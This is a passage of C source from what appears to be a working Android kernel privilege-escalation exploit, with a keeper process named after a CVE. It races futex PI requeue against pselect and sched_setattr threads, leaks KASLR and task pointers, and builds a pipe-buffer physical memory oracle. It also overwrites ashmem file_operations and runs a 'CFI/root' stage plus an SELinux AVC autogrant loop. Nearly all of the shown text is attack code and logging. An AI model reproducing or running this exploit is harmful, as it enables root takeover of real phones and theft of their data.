               send(ready_peer, "!", 1, MSG_OOB) != 1 ||
               send(ready_peer, "R", 1, MSG_DONTWAIT) != 1; })) {
#else
               send(ready_peer, "R", 1, MSG_DONTWAIT) != 1 ||
               send(ready_peer, "!", 1, MSG_OOB) != 1; })) {
#endif
#endif
#else
            send(ready_peer, "!", 1, MSG_OOB) != 1) {
#endif
#endif
          pr_warning("pselect readiness trigger errno=%d\n", errno);
        }
        if (ready_peer >= 0) {
          wake_done_ns = pselect_sched_timing ? gettime_ns() : 0;
        }
#if defined(PSELECT_SCHED_HELPER_AFTER_WAKE) && PSELECT_SCHED_HELPER_AFTER_WAKE && \
    !PSELECT_PERF_TARGET_SP_DIAG
        if (ready_peer >= 0 && PSELECT_SCHED_HELPERS > 0) {
          atomic_store(&pselect_sched_tid, tid);
          atomic_store(&pselect_sched_fire_ns, wake_done_ns);
          atomic_fetch_add(&pselect_sched_fire, 1);
        }
#endif
#if defined(PSELECT_SAME_CORE_YIELD_AFTER_WAKE) && PSELECT_SAME_CORE_YIELD_AFTER_WAKE
        /* The producer and pselect thread share one CPU in this diagnostic.
         * Let the woken pselect task run into the file-backed copyout fault
         * before polling its wchan. */
        if (ready_peer >= 0) {
          sched_yield();
        }
#endif
#if defined(PSELECT_SYNC_COPYOUT_WCHAN) && PSELECT_SYNC_COPYOUT_WCHAN
        if (ready_peer >= 0 && !disable_wchan_sync) {
          if (!main_wait_for_pselect_copyout(
                  copyout_wchan_fd, PSELECT_COPYOUT_SYNC_TIMEOUT_USEC,
                  tid, consumer_nice, copyout_wchan, sizeof(copyout_wchan),
                  &sched_ret, &sched_errno, &sched_call_ns,
                  &sched_done_ns)) {
#if PSELECT_PERF_TARGET_SP_DIAG
            /* A short fault may finish before /proc/wchan observes it.  The
             * perf ring still contains the completed syscall path. */
            target_sp_perf_stop_and_report();
#endif
            pr_warning("pselect copyout sync missed wchan=%s\n",
                       copyout_wchan);
            close(copyout_wchan_fd);
            atomic_fetch_sub(&consumer_inflight, 1);
            atomic_store(&punch_consume_go, 0);
            break;
          }
          copyout_sync_observed = 1;
          sched_called_in_wait = 1;
          sync_done_ns = pselect_sched_timing ? gettime_ns() : 0;
        }
#endif
        if (ready_peer >= 0 && pselect_post_ready_delay_ns != 0) {
          size_t delay_started_ns = gettime_ns();
          while (gettime_ns() - delay_started_ns <
                 pselect_post_ready_delay_ns) {
            if (atomic_load(&pselect_returned)) {
              break;
            }
            __asm__ volatile("yield" ::: "memory");
          }
          if (atomic_load(&pselect_returned)) {
            pr_warning("pselect production window expired before scheduler "
                       "delay_ns=%zu\n", pselect_post_ready_delay_ns);
            atomic_fetch_sub(&consumer_inflight, 1);
            atomic_store(&punch_consume_go, 0);
            break;
          }
        }
        if (ready_peer >= 0 && pselect_post_ready_spin_iters > 0) {
          for (int spin = 0; spin < pselect_post_ready_spin_iters; spin++) {
            if (atomic_load(&pselect_returned)) {
              break;
            }
            __asm__ volatile("yield" ::: "memory");
          }
          if (atomic_load(&pselect_returned)) {
            pr_warning("pselect production window expired before scheduler "
                       "spin_iters=%d\n", pselect_post_ready_spin_iters);
            atomic_fetch_sub(&consumer_inflight, 1);
            atomic_store(&punch_consume_go, 0);
            break;
          }
        }
#endif
#ifdef PSELECT_CONSUMER_SPIN_YIELDS
        for (int spin = 0; spin < PSELECT_CONSUMER_SPIN_YIELDS; spin++) {
          __asm__ volatile("yield" ::: "memory");
        }
#endif
#if (defined(PSELECT_VALIDATE_ONLY) && PSELECT_VALIDATE_ONLY) || \
    PSELECT_PERF_TARGET_SP_DIAG
        pr_info("pselect output validation passed; diagnostic scheduler skipped\n");
#else
        if (!sched_called_in_wait) {
          atomic_store(&pselect_sched_tid, tid);
          atomic_fetch_add(&pselect_sched_fire, 1);
          errno = 0;
          sched_call_ns = pselect_sched_timing ? gettime_ns() : 0;
          sched_ret = sched_setattr_tid(tid, consumer_nice);
          sched_done_ns = pselect_sched_timing ? gettime_ns() : 0;
          sched_errno = errno;
        }
#endif
        if (sched_ret == 0) {
          /*
           * The perf leak was taken in this retained waiter/consumer thread.
           * Publish it before the consumer-side CFI/root stage; the normal
           * post-pselect oracle records the same value too late for that
           * early path.
           */
          if (!pselect_observed_task &&
              is_direct_ptr(runtime_waiter_task)) {
            pselect_observed_task = runtime_waiter_task;
            pr_info("pselect consumer observed task=%016zx\n",
                    pselect_observed_task);
          }
          atomic_fetch_add(&consumer_success, 1);
#if defined(PSELECT_CFI_IN_CONSUMER) && PSELECT_CFI_IN_CONSUMER
          if (!atomic_load(&cfi_stage_done)) {
            if (try_cfi_stage()) {
              pr_info("pselect consumer cfi completed tid=%d\n", tid);
            } else {
              pr_warning("pselect consumer cfi failed step=%d errno=%d\n",
                         cfi_last_step, cfi_last_errno);
            }
          }
#endif
          if (getenv("PSELECT_CFI_IN_CONSUMER_RUNTIME") &&
              !atomic_load(&cfi_stage_done)) {
            if (try_cfi_stage()) {
              pr_info("pselect consumer runtime cfi completed tid=%d\n", tid);
            } else {
              pr_warning("pselect consumer runtime cfi failed step=%d "
                         "errno=%d\n", cfi_last_step, cfi_last_errno);
            }
          }
#if defined(PSELECT_SCHED_DIAG) && PSELECT_SCHED_DIAG
          errno = 0;
          int after_policy = sched_getscheduler(tid);
          int after_policy_errno = errno;
          errno = 0;
          int after_nice = getpriority(PRIO_PROCESS, tid);
          int after_nice_errno = errno;
          pr_info("pselect consumer sched_setattr ok tid=%d nice=%d "
                  "policy=%d policy_errno=%d getpriority=%d "
                  "getpriority_errno=%d timing_enabled=%d "
                  "timing_ns=%lld/%lld/%lld/%lld\n",
                  tid, consumer_nice, after_policy, after_policy_errno,
                  after_nice, after_nice_errno, pselect_sched_timing,
                  wake_done_ns && ready_exchange_ns ?
                      ns_delta_signed(wake_done_ns, ready_exchange_ns) : 0,
                  sched_call_ns && wake_done_ns ?
                      ns_delta_signed(sched_call_ns, wake_done_ns) : 0,
                  sched_done_ns && sched_call_ns ?
                      ns_delta_signed(sched_done_ns, sched_call_ns) : 0,
                  sync_done_ns && sched_done_ns ?
                      ns_delta_signed(sync_done_ns, sched_done_ns) : 0);
#endif
        } else {
          pr_warning("pselect consumer sched_setattr ret=%ld errno=%d tid=%d nice=%d\n",
                     sched_ret, sched_errno, tid, consumer_nice);
        }
        if (copyout_sync_observed) {
          pr_info("pselect copyout sync wchan=%s helpers=%d\n",
                  copyout_wchan, atomic_load(&pselect_sched_done));
          if (copyout_wchan_fd >= 0) {
            close(copyout_wchan_fd);
            copyout_wchan_fd = -1;
          }
        }
        atomic_fetch_sub(&consumer_inflight, 1);
        calls_this_seq++;
        (void)routed_pselect;
        if (calls_this_seq >= CONSUMER_MAX_CALLS) {
          atomic_store(&punch_consume_go, 0);
          break;
        }
      }
    }
  }

  return NULL;
}

void reset_main_route_state(void) {
  f_wait = 0;
  f_pi_target = 0;
  f_pi_chain = 0;
  atomic_store(&waiter_ready, 0);
  atomic_store(&waiter_waiting, 0);
  atomic_store(&owner_started, 0);
  atomic_store(&owner_chain_done, 0);
  atomic_store(&route_done, 0);
  atomic_store(&waiter_tid, 0);
  atomic_store(&punch_consume_go, 0);
  atomic_store(&punch_consume_stop, 0);
  atomic_store(&consumer_calls, 0);
  atomic_store(&consumer_success, 0);
  atomic_store(&consumer_inflight, 0);
  atomic_store(&pselect_ready_peer_fd, -1);
  atomic_store(&pselect_ready_target_fd, -1);
  atomic_store(&pselect_write_drain_fd, -1);
  atomic_store(&pselect_returned, 0);
  atomic_store(&pselect_output_valid, 0);
  atomic_store(&pselect_copyout_fault_base, 0);
  atomic_store(&pselect_copyout_fault_fd, -1);
  atomic_store(&pselect_sched_fire, 0);
  atomic_store(&pselect_sched_tid, 0);
  atomic_store(&pselect_sched_done, 0);
  atomic_store(&pselect_sched_fire_ns, 0);
  atomic_store(&main_route_delay_usec, PSELECT_ENTER_DELAY_USEC);
  const char *post_ready_delay = getenv("PSELECT_POST_READY_DELAY_NSEC");
  pselect_post_ready_delay_ns = post_ready_delay
      ? (size_t)strtoull(post_ready_delay, NULL, 0)
      : 0;
  const char *post_ready_spin = getenv("PSELECT_POST_READY_SPIN_ITERS");
  pselect_post_ready_spin_iters = post_ready_spin
      ? (int)strtol(post_ready_spin, NULL, 0)
      : 0;
  if (pselect_post_ready_spin_iters < 0) {
    pselect_post_ready_spin_iters = 0;
  }
  const char *wchan_pre_sched_delay =
      getenv("PSELECT_WCHAN_PRE_SCHED_DELAY_NSEC");
  pselect_wchan_pre_sched_delay_ns = wchan_pre_sched_delay
      ? (size_t)strtoull(wchan_pre_sched_delay, NULL, 0)
      : 0;
  const char *wchan_pre_sched_spin =
      getenv("PSELECT_WCHAN_PRE_SCHED_SPIN_ITERS");
  pselect_wchan_pre_sched_spin_iters = wchan_pre_sched_spin
      ? (int)strtol(wchan_pre_sched_spin, NULL, 0)
      : 0;
  if (pselect_wchan_pre_sched_spin_iters < 0) {
    pselect_wchan_pre_sched_spin_iters = 0;
  }
  pselect_sched_timing = getenv("PSELECT_DISABLE_SCHED_TIMING_RUNTIME") == NULL;
  atomic_store(&pipe_prepare_request, 0);
  atomic_store(&pipe_prepare_done, 0);
  cfi_last_step = 0;
  cfi_last_errno = 0;
}

static int prestart_waiter_before_fops_payload(void) {
#if PSELECT_PRESTART_WAITER_BEFORE_FOPS
  reset_main_route_state();
  atomic_store(&waiter_prestart_ready, 0);
  atomic_store(&waiter_prestart_go, 0);
  atomic_store(&waiter_prestart_leak_ok, 0);
  SYSCHK(pthread_create(&prestarted_waiter, NULL, waiter_thread, NULL));
  while (!atomic_load(&waiter_prestart_ready)) {
    usleep(1000);
  }
  if (!atomic_load(&waiter_prestart_leak_ok)) {
    pr_error("prestarted waiter task leak failed\n");
    return 0;
  }
  pr_success("prestarted waiter retained tid=%d task=%016zx\n",
             atomic_load(&waiter_tid), runtime_waiter_task);
#endif
  return 1;
}

/* SH53D: spam scheduler (see run_main_route_threads). Fires sched_setattr
 * on the waiter continuously; safe no-op unless pi_blocked_on is set. */
static void *spam_sched_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  long calls = 0;
  unsigned long long ttot = 0, tmax = 0;
  pr_info("spam init waiter_tid=%d\n", atomic_load(&waiter_tid));
  while (!atomic_load(&punch_consume_stop)) {
    int tid = atomic_load(&waiter_tid);
    if (calls < 5 || (calls % 2000) == 0)
      pr_info("spam loop calls=%ld tid=%d\n", calls, tid);
    if (tid > 0) {
      errno = 0;
      unsigned long long t0 = 0, t1 = 0;
      __asm__ volatile("isb" ::: "memory");
      __asm__ volatile("mrs %0, cntvct_el0" : "=r"(t0));
      __asm__ volatile("isb" ::: "memory");
      long sr = sched_setattr_tid(tid, (int)PSELECT_CONSUMER_NICE);
      __asm__ volatile("isb" ::: "memory");
      __asm__ volatile("mrs %0, cntvct_el0" : "=r"(t1));
      __asm__ volatile("isb" ::: "memory");
      if (sr == 0) {
        unsigned long long dt = t1 - t0;
        ttot += dt;
        if (dt > tmax) tmax = dt;
      }
      if (++calls == 1000 || (calls % 2000) == 0)
        pr_info("spam sched calls=%ld avg=%llu max=%llu\n", calls,
                calls ? ttot / (unsigned long long)calls : 0, tmax);
    }
    usleep(1000);
  }
  pr_info("spam sched done calls=%ld\n", calls);
  return NULL;
}

void run_main_route_threads(void) {
#if PSELECT_PRESTART_WAITER_BEFORE_FOPS
  pthread_t waiter = prestarted_waiter;
  atomic_store(&waiter_prestart_go, 1);
#else
  reset_main_route_state();
  pthread_t waiter;
  SYSCHK(pthread_create(&waiter, NULL, waiter_thread, NULL));
#endif
  pthread_t owner;
  pthread_t consumer;
  pthread_t sched_helpers[PSELECT_SCHED_HELPERS];
  SYSCHK(pthread_create(&owner, NULL, owner_thread, NULL));
  SYSCHK(pthread_create(&consumer, NULL, consumer_thread, NULL));
  for (int i = 0; i < PSELECT_SCHED_HELPERS; i++) {
    SYSCHK(pthread_create(&sched_helpers[i], NULL,
                          pselect_sched_helper_thread,
                          (void *)(intptr_t)i));
  }
  /* SH53D: optional spam-scheduler thread (env PSELECT_SPAM_SCHED_RUNTIME).
   * Fires sched_setattr on the waiter continuously, covering every window
   * without orchestration. Safe: no-op unless waiter has pi_blocked_on. */
  if (getenv("PSELECT_SPAM_SCHED_RUNTIME")) {
    pthread_t spam;
    pr_info("spam starting\n");
    SYSCHK(pthread_create(&spam, NULL, spam_sched_thread, NULL));
    (void)spam;
  }

  while (!atomic_load(&waiter_waiting) || !atomic_load(&owner_started)) {
    usleep(1000);
  }

  /* SH53D: flags race the actual futex block (set before the syscall).
   * Gate the requeue on wchan showing BOTH threads really blocked in
   * futex_wait_queue_me, else the deadlock never forms on a loaded phone.
   * Falls back to a blind delay after timeout. */
  {
    int wfd = main_open_task_wchan(atomic_load(&waiter_tid));
    int ofd = main_open_task_wchan(atomic_load(&owner_tid));
    char wb[64], ob[64];
    int gated = 0;
    for (int i = 0; i < 6000; i++) {
      int wok = main_read_wchan_fd(wfd, wb, sizeof(wb));
      int ook = main_read_wchan_fd(ofd, ob, sizeof(ob));
      int wblocked = wok && strcmp(wb, "futex_wait_queue_me") == 0;
      int oblocked = ook && (strcmp(ob, "futex_wait_queue_me") == 0 ||
                             strcmp(ob, "rt_mutex_wait_proxy_lock") == 0);
      if (wblocked && oblocked) {
        gated = 1;
        break;
      }
      usleep(5000);
    }
    pr_info("requeue gate waiter='%s' owner='%s' gated=%d\n",
            wfd >= 0 ? wb : "?",
            ofd >= 0 ? ob : "?", gated);
    if (wfd >= 0) close(wfd);
    if (ofd >= 0) close(ofd);
  }
  errno = 0;
  long rq = futex_op(&f_wait, FUTEX_CMP_REQUEUE_PI, 1, (void *)1, &f_pi_target, 0);
  pr_info("requeue ret=%ld errno=%d (EDEADLK=%d expected for stale)\n",
          rq, errno, EDEADLK);

  while (!atomic_load(&route_done)) {
    if (atomic_exchange(&pipe_prepare_request, 0)) {
      pipebuf_page_base = prepare_pipe_buffer_page();
      atomic_store(&pipe_prepare_done, 1);
    }
    usleep(10000);
  }
  atomic_store(&punch_consume_stop, 1);
}

static pid_t spawn_allocation_keeper(void) {
  pid_t child = SYSCHK(fork());
  if (child != 0) {
    return child;
  }

  syscall(SYS_prctl, PR_SET_PDEATHSIG, 0, 0, 0, 0);
  syscall(SYS_prctl, PR_SET_NAME, "cve43499-hold", 0, 0, 0);
  syscall(SYS_setsid);

  int null_fd = (int)syscall(
      SYS_openat, AT_FDCWD, "/dev/null", O_RDWR | O_CLOEXEC, 0);
  if (null_fd >= 0) {
    for (int fd = STDIN_FILENO; fd <= STDERR_FILENO; fd++) {
      if (null_fd != fd) {
        syscall(SYS_dup3, null_fd, fd, 0);
      }
    }
    if (null_fd > STDERR_FILENO) {
      syscall(SYS_close, null_fd);
    }
  } else {
    syscall(SYS_close, STDIN_FILENO);
    syscall(SYS_close, STDOUT_FILENO);
    syscall(SYS_close, STDERR_FILENO);
  }

  if (cfi_rw_keeper_fd >= 0) {
    root_avc_autogrant_loop(cfi_rw_keeper_fd);
  }

  struct timespec hold = {
    .tv_sec = 86400,
    .tv_nsec = 0,
  };
  for (;;) {
    syscall(SYS_nanosleep, &hold, NULL);
  }
}

#if defined(APP_PAYLOAD) && APP_PAYLOAD && \
    defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
static int fops_data_alias_deferred;
static uintptr_t fops_data_alias_deferred_target;
static uint64_t fops_data_alias_deferred_initial;

static int verify_fops_data_alias_before_production(void) {
  uintptr_t saved_gate_page = p0_gate_page_struct;
  uintptr_t saved_probe_page = p0_probe_page_struct;
#if defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) && \
    APP_P0_FINGERPRINT_INVERSE_SLIDE
  uintptr_t aliases[] = {
    data_addr(ASHMEM_MISC_FOPS),
  };
  const char *names[] = {"probe-derived"};
#else
  uintptr_t aliases[] = {
    p0_data_alias(ASHMEM_MISC_FOPS) + slide_p0_offset,
    p0_data_alias(ASHMEM_MISC_FOPS),
  };
  const char *names[] = {"with-slide", "without-slide"};
#endif
  uint64_t expected = text_addr(ASHMEM_FOPS);
  int verified = 0;
  int abort_verification = 0;

  for (size_t index = 0; index < sizeof(aliases) / sizeof(aliases[0]);
       index++) {
    int fresh_attempt = 1;
    int search_batch = 0;
#ifdef APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES
    const int max_search_batches = APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES;
#else
    const int max_search_batches = APP_FOPS_FRESH_PAGE_ATTEMPTS;
#endif
    int prepare_oracle = 1;
    while (fresh_attempt <= APP_FOPS_FRESH_PAGE_ATTEMPTS &&
           search_batch < max_search_batches) {
      fops_data_probe_addr = aliases[index];
      fops_data_probe_active = 1;
      if (prepare_oracle) {
        reset_pipe_attempt();
        if (!prepare_p0_pipe_oracle()) {
          pr_error("fops data alias pipe preparation failed candidate=%s\n",
                   names[index]);
          abort_verification = 1;
          break;
        }
        prepare_oracle = 0;
      }
      page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
      search_batch++;
      pr_info("fops data alias search candidate=%s batch=%d/%d "
              "gate_attempt=%d/%d base=%016zx\n",
              names[index], search_batch, max_search_batches,
              fresh_attempt, APP_FOPS_FRESH_PAGE_ATTEMPTS, page_base);
      if (!page_base) {
        pr_warning("fops data alias page unavailable candidate=%s "
                   "fresh=%d/%d\n",
                   names[index], fresh_attempt,
                   APP_FOPS_FRESH_PAGE_ATTEMPTS);
#ifndef APP_FOPS_KERNEL_PAGE_SEARCH_BATCHES
        fresh_attempt++;
        prepare_oracle = 1;
#endif
        continue;
      }

      int gate_triggered =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_SLOT);
      int gate_result = gate_triggered
          ? verify_p0_pipe_oracle_gate()
          : 0;
      pr_info("fops data alias gate candidate=%s fresh=%d/%d "
              "triggered=%d result=%d page=%016zx\n",
              names[index], fresh_attempt,
              APP_FOPS_FRESH_PAGE_ATTEMPTS, gate_triggered,
              gate_result, page_base);
      if (gate_result == 0) {
        pr_warning("fops data alias reclaim miss candidate=%s "
                   "fresh=%d/%d\n",
                   names[index], fresh_attempt,
                   APP_FOPS_FRESH_PAGE_ATTEMPTS);
        fresh_attempt++;
        prepare_oracle = 1;
        continue;
      }

      app_publish_p0_dirty();
      if (gate_result < 0) {
        pr_error("fops data alias gate changed unexpected pages "
                 "candidate=%s\n", names[index]);
        app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
        abort_verification = 1;
        break;
      }

      int alias_triggered =
          app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_SLOT);
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
      /*
       * Keep the redirected pipe_buffer queued across production slot 4.
       * Reading it now would only reconfirm the pre-write ashmem_fops value;
       * reading it after slot 4 directly measures the target word and avoids
       * treating the ashmem/configfs CFI route as a memory-read oracle.
       */
      int result = alias_triggered ? 1 : 0;
      int gate_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
      if (alias_triggered && gate_restored) {
        fops_data_alias_deferred = 1;
        fops_data_alias_deferred_target = fops_data_probe_addr;
        fops_data_alias_deferred_initial = expected;
      }
      pr_info("fops data alias deferred candidate=%s address=%016zx "
              "initial=%016llx gate=%d triggered=%d armed=%d "
              "gate_restored=%d page=%016zx\n",
              names[index], fops_data_probe_addr,
              (unsigned long long)expected, gate_result,
              alias_triggered, fops_data_alias_deferred,
              gate_restored, page_base);
#else
      int result = alias_triggered
          ? verify_p0_pipe_data_page(fops_data_probe_addr, expected)
          : 0;
      int gate_restored =
          app_trigger_fops_oracle_slot(P0_ORACLE_GATE_RESTORE_SLOT);
      int alias_restored = alias_triggered
          ? app_trigger_fops_oracle_slot(P0_ORACLE_PROBE_RESTORE_SLOT)
          : 0;
      pr_info("fops data alias candidate=%s address=%016zx "
              "expected=%016llx gate=%d triggered=%d result=%d "
              "gate_restored=%d alias_restored=%d page=%016zx\n",
              names[index], fops_data_probe_addr,
              (unsigned long long)expected, gate_result,
              alias_triggered, result, gate_restored,
              alias_restored, page_base);
#endif
#if defined(APP_FOPS_DEFER_ALIAS_READBACK) && \
    APP_FOPS_DEFER_ALIAS_READBACK
      if (!gate_restored || !alias_triggered ||
          !fops_data_alias_deferred) {
        pr_error("fops data alias deferred arm failed candidate=%s\n",
                 names[index]);
        abort_verification = 1;
        break;
      }
      if (result == 1) {
        verified = 1;
      }
#else
      if (!gate_restored || (alias_triggered && !alias_restored)) {
        pr_error("fops data alias restore failed candidate=%s\n",
                 names[index]);
        abort_verification = 1;
        break;
      }
      if (result == 1 && alias_triggered && alias_restored) {
#if !defined(APP_P0_FINGERPRINT_INVERSE_SLIDE) || \
    !APP_P0_FINGERPRINT_INVERSE_SLIDE
        data_alias_uses_slide = index == 0;
#endif
        verified = 1;
      }
#endif
      break;
    }
    if (verified || abort_verification) {
      break;
    }
  }

  p0_gate_page_struct = saved_gate_page;
  p0_probe_page_struct = saved_probe_page;
  fops_data_probe_active = 0;
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  if (verified) {
    pr_info("fops data alias retaining verified payload page=%016zx "
            "pipe_page=%016zx production_slot=%d\n",
            page_base, pipebuf_page_base, P0_ORACLE_PRODUCTION_SLOT);
  } else {
    reset_pipe_attempt();
  }
#else
  reset_pipe_attempt();
#endif
  pr_info("fops data alias selected verified=%d runtime_slide=%08zx "
          "uses_slide=%d\n",
          verified, slide_p0_offset, data_alias_uses_slide);
  return verified;
}
#endif

int run_exploit(int argc, char **argv) {
  (void)argc;
  (void)argv;

  setvbuf(stdout, NULL, _IONBF, 0);
  setvbuf(stderr, NULL, _IONBF, 0);
  disable_rseq_for_thread();
  set_limit();
  log_startup_context();
  init_ashmem_path();

  pin_to_core(CORE);
  if (!slide_leak_kernel_base()) {
    pr_error("slide kaslr leak failed\n");
    return 1;
  }
  if (getenv("ASHMEM_MISC_FOPS_HWBKPT_DIAG")) {
    return ashmem_fops_hw_breakpoint_diag() ? 0 : 1;
  }
#if defined(PERF_CURRENT_TASK_WAITER) && PERF_CURRENT_TASK_WAITER && \
    !PSELECT_PRESTART_WAITER_BEFORE_FOPS
  if (!leak_current_task_perf()) {
    pr_error("live task pointer leak failed; refusing scheduler trigger\n");
    return 1;
  }
#endif
  if (getenv("SLIDE_ONLY") || getenv("P0_ONLY")) {
    pr_success("slide-only done base=%016zx slide=%016zx p0_offset=%08zx\n",
               kaslr_base, kaslr_slide, slide_p0_offset);
    return 0;
  }
  /* Resolve and retain the per-file target before creating the PI waiter.
   * Sampling it after prestart leaves the race threads parked while a large
   * ioctl burst runs and measurably changes the scheduler window. */
  if (getenv("PSELECT_PREOPEN_FILE_FOPS_TARGET") &&
      !runtime_file_fops_target &&
      !prepare_preopened_ashmem_file_target()) {
    pr_error("preopened ashmem file target leak failed\n");
    return 1;
  }
#if PSELECT_PRESTART_WAITER_BEFORE_FOPS
  if (!prestart_waiter_before_fops_payload()) {
    return 1;
  }
#endif
#if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
  if (!slide_p0_session_fresh) {
    pr_error("full route requires P0 discovery in the current exploit process; "
             "refusing forced or retained cross-process slide\n");
    return 1;
  }
#endif

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (getenv("FOPS_P0_SINGLE_PROBE")) {
    reset_pipe_attempt();
    int zero_page_control =
        getenv("FOPS_P0_ZERO_PAGE_CONTROL") != NULL;
    uintptr_t zero_page_off = EMPTY_ZERO_PAGE_OFF;
    const char *zero_page_off_runtime =
        getenv("FOPS_P0_ZERO_PAGE_OFF_RUNTIME");
    if (zero_page_control && zero_page_off_runtime &&
        *zero_page_off_runtime) {
      char *end = NULL;
      errno = 0;
      unsigned long long parsed =
          strtoull(zero_page_off_runtime, &end, 0);
      if (!errno && end != zero_page_off_runtime && !*end &&
          !(parsed & (PAGE_SIZE - 1)) && parsed < 0x4000000ULL) {
        zero_page_off = (uintptr_t)parsed;
      } else {
        pr_error("invalid FOPS_P0_ZERO_PAGE_OFF_RUNTIME=%s\n",
                 zero_page_off_runtime);
        return 1;
      }
    }
    fops_data_probe_addr = zero_page_control
        ? p0_data_alias(KIMAGE_TEXT_BASE + zero_page_off)
        : p0_data_alias(ASHMEM_MISC_FOPS) + slide_p0_offset;
    pr_info("fops p0 single-probe target-kind=%s offset=%08zx "
            "address=%016zx\n",
            zero_page_control ? "empty-zero-page" : "ashmem-misc-fops",
            zero_page_control ? zero_page_off : (uintptr_t)ASHMEM_MISC_FOPS_OFF,
            fops_data_probe_addr);
    p0_probe_page_struct = direct_to_page(
        fops_data_probe_addr & ~(PAGE_SIZE - 1));
    fops_data_probe_active = 1;
    if (!prepare_p0_pipe_oracle()) {
      pr_error("fops p0 single-probe pipe preparation failed\n");
      return 1;
    }
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
    if (!page_base) {
      pr_error("fops p0 single-probe payload page unavailable\n");
      return 1;
    }
    if (getenv("FOPS_PAGE_PREP_ONLY")) {
      pr_success("fops page-prep-only completed base=%016zx; "
                 "scheduler trigger skipped\n", page_base);
      return 0;
    }
    /*
     * open_selected_fds() builds the pselect shape with dup2() and can replace
     * oracle pipe endpoints below PSELECT_ROUTE_NFDS before the waiter ever
     * blocks.  Preserve those endpoints after all kernel-page shaping but
     * before route setup.  Saving them from the consumer after the chosen
     * write is too late: at that point the affected fd already names a socket.
     */
    if (!preserve_p0_pipe_oracle_fds()) {
      pr_error("p0 readback fd preservation failed before route setup\n");
      return 1;
    }
    SYSCHK(setenv("PSELECT_SKIP_CFI_AFTER_ORACLE", "1", 1));
    run_main_route_threads();
    if (cfi_last_step != 36) {
      pr_warning("fops p0 single-probe write oracle missed step=%d errno=%d; "
                 "readback skipped\n",
                 cfi_last_step, cfi_last_errno);
      return 1;
    }
    if (getenv("FOPS_P0_CONTROL_SELF_TARGET")) {
      if (getenv("FOPS_P0_CONTROL_RIGHT_FALLBACK")) {
        size_t changed = diagnose_reclaim_payload_mutations();
        pr_info("fops p0 right-fallback mutation words=%zu\n", changed);
      }
      pr_success("fops p0 control chosen-write reached with retained pipe\n");
      return 0;
    }
    if (getenv("FOPS_P0_GATE_CONTROL")) {
      int result = verify_p0_pipe_oracle_gate();
      pr_info("fops p0 gate-control result=%d payload=%016zx page=%016zx\n",
              result, page_base, p0_probe_page_struct);
      fflush(NULL);
      return result == 1 ? 0 : 1;
    }
    uint64_t expected = zero_page_control ? 0 : text_addr(ASHMEM_FOPS);
    int merge_root = getenv("FOPS_P0_SINGLE_MERGE_ROOT") != NULL;
    int result = merge_root
        ? verify_and_merge_p0_pipe_data_page_single_active(
              fops_data_probe_addr, fake_fops)
        : verify_p0_pipe_data_page_single_active(
              fops_data_probe_addr, expected);
    pr_info("fops p0 single-probe result=%d target=%016zx expected=%016llx\n",
            result, fops_data_probe_addr, (unsigned long long)expected);
    if (merge_root && result == 1) {
      int rooted = try_cfi_stage();
      pr_info("fops p0 single-merge cfi rooted=%d step=%d errno=%d\n",
              rooted, cfi_last_step, cfi_last_errno);
      fflush(NULL);
      return rooted ? 0 : 1;
    }
    fflush(NULL);
    return result == 1 ? 0 : 1;
  }
#endif

#if defined(APP_FOPS_DATA_ALIAS_DIAG_ONLY) && \
    APP_FOPS_DATA_ALIAS_DIAG_ONLY
  if (!verify_fops_data_alias_before_production()) {
    pr_error("fops data alias verification failed; production skipped\n");
    return 1;
  }
  if (getenv("FOPS_DATA_ALIAS_VERIFY_ONLY")) {
    pr_success("fops data alias verify-only complete\n");
    return 0;
  }
#endif

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
#if defined(APP_FOPS_REUSE_VERIFIED_PAGE) && \
    APP_FOPS_REUSE_VERIFIED_PAGE
  pr_info("reusing verified fops payload page=%016zx pipe_page=%016zx\n",
          page_base, pipebuf_page_base);
  if (!is_direct_ptr(page_base) || !is_direct_ptr(pipebuf_page_base)) {
    return 1;
  }
#else
  reset_pipe_attempt();
#if defined(APP_FOPS_ORACLE_DIAG_ONLY) && APP_FOPS_ORACLE_DIAG_ONLY
  if (!prepare_p0_pipe_oracle()) {
    pr_error("fops oracle pipe preparation failed\n");
    return 1;
  }
  pr_info("fresh fops oracle pipe page=%016zx\n", pipebuf_page_base);
#else
  pipebuf_page_base = prepare_pipe_buffer_page();
  pr_info("fresh physrw pipe page=%016zx\n", pipebuf_page_base);
  if (!is_direct_ptr(pipebuf_page_base)) {
    return 1;
  }
#endif
#endif
#endif

  pin_to_core(CORE);
#if !defined(APP_FOPS_REUSE_VERIFIED_PAGE) || \
    !APP_FOPS_REUSE_VERIFIED_PAGE
  page_base = prepare_good_kernel_page(PAGE_PAYLOAD_FOPS);
#endif
  if (getenv("FOPS_DIAGNOSTIC_STOP_AFTER_PREPARE")) {
    pr_warning("diagnostic stop after fops prepare; trigger not entered "
               "base=%016zx\n",
               page_base);
    return page_base ? 2 : 1;
  }

#if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
  if (!page_base) {
    return 1;
  }
#if defined(APP_PHYS_VIRTUAL_BASE_ORACLE) && APP_PHYS_VIRTUAL_BASE_ORACLE
  pr_info("app fops stage=prepare-return base=%016zx\n", page_base);
  if (getenv("FOPS_DIAGNOSTIC_STOP_AFTER_PREPARE")) {
    pr_warning("diagnostic stop after fops prepare; trigger not entered\n");
    if (pipe_prepare_child > 0) {
      SYSCHK(kill(pipe_prepare_child, SIGKILL));
      SYSCHK(waitpid(pipe_prepare_child, NULL, 0));
